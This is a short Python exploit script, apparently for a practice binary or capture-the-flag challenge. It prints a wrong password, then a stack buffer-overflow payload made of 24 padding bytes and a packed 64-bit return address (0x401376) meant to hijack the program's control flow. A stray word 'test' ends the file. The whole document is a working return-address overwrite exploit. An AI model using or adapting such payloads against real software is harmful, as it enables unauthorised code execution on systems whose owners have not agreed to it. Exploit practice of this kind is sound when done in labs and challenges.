import sys
import struct
first=b"wrongpass\n"

sys.stdout.buffer.write(first)

address = "0x401376" 

payload = b"A"*16+b"B"*8
payload += struct.pack("<Q",int(address, 16))+b"\n"

sys.stdout.buffer.write(payload)

test
